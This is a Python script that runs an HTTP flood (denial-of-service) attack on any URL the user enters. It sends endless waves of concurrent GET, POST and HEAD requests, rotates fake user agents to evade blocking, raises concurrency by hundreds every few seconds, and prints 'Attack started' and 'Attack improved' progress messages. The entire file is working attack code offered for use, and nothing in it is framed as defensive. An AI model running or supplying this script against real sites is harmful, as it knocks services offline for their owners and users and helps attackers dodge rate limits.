import aiohttp
import asyncio
import time
from aiohttp import ClientSession
from aiohttp.connector import TCPConnector
from fake_useragent import UserAgent
import random

# Input prompts for configurable parameters
MAX_CONCURRENT_REQUESTS = int(input("Enter Concurrency Level: "))
keepalive_timeout = int(input("Enter keepalive timeout in seconds: "))
limit_multiplier = int(input("Enter the multiplier for the connection pool: "))

target_url = input("Enter the target URL: ")

ua = UserAgent()

# Function to randomly choose request method (GET, POST, HEAD)
async def send_request(session: ClientSession, target_url: str, count: int):
    headers = {
        'User-Agent': ua.random  # Random user agent for each request
    }
    
    # Randomly choose a request method
    method = random.choice(['GET', 'POST', 'HEAD'])
    try:
        if method == 'GET':
            async with session.get(target_url, headers=headers) as response:
                if response.status == 200:
                    return True  # Indicate successful request
        elif method == 'POST':
            async with session.post(target_url, headers=headers, data={}) as response:  # You can add actual data for POST if needed
                if response.status == 200:
                    return True
        elif method == 'HEAD':
            async with session.head(target_url, headers=headers) as response:
                if response.status == 200:
                    return True
    except Exception as e:
        print(f"Error sending request: {e}")
        return False

    return False

# Function to handle the request sending loop
async def request_loop():
    global MAX_CONCURRENT_REQUESTS  # To allow modifying concurrency dynamically
    
    # Customizing the TCPConnector based on user inputs
    connector = TCPConnector(
        limit_per_host=MAX_CONCURRENT_REQUESTS,
        limit=MAX_CONCURRENT_REQUESTS * limit_multiplier,  # Using user-defined multiplier
        keepalive_timeout=keepalive_timeout  # Using user-defined timeout
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        count = 0
        start_time = time.time()
        last_time = start_time
        last_requests_per_second = 0

        print(f"Attack started on {target_url} with speed: 0 requests/s")

        while True:
            tasks = []
            for i in range(MAX_CONCURRENT_REQUESTS):
                count += 1
                tasks.append(send_request(session, target_url, count))

            results = await asyncio.gather(*tasks)

            # Calculate the speed of requests
            elapsed_time = time.time() - start_time
            requests_per_second = count / elapsed_time if elapsed_time > 0 else 0

            if time.time() - last_time > random.randint(3, 4):  # Trigger speed improvement every few seconds
                # Increase concurrency to simulate improvement
                MAX_CONCURRENT_REQUESTS += random.randint(100, 500)
                print(f"Let's get faster!!!")
                print(f"Attack improved on {target_url} with speed: {requests_per_second:.2f} requests/s")
                last_time = time.time()

            # Print the current speed (requests per second)
            print(f"Requests per second: {requests_per_second:.2f} (Total requests sent: {count})")

            # Check if the speed has increased
            if requests_per_second > last_requests_per_second:
                last_requests_per_second = requests_per_second

            # Retry failed requests
            failed_requests = results.count(False)
            if failed_requests > 0:
                print(f"Retrying {failed_requests} failed requests...")
                await asyncio.sleep(0.1)  # Retry faster

# Run the event loop
if __name__ == "__main__":
    asyncio.run(request_loop())
